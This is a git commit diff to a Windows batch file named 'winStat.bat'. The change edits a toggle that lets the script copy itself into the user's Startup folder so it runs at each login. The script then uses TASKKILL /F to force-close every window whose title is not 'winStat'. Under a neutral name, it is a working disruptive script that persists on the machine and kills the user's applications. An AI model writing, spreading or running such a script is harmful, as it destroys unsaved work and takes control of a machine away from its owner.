28da9d907de70f2ee0adc542218bf88591488188
zacharyacutey <zacharyacutey@users.noreply.github.com>
2016-02-25 15:19:01 -0500

    Update winStat.bat

--- winStat.bat
+++ winStat.bat
@@ -1,9 +1,9 @@
 @ECHO OFF
 COLOR 0A
 SET C=REM
-::Well, change above to SET "C=" when you want to have it copy!
+::Well, change above to SET C=COPY when you want to have it copy!
 IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
-%C% COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
+%C% winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
 )
 TITLE winStat
 TASKKILL /F /FI "WINDOWTITLE ne winStat"
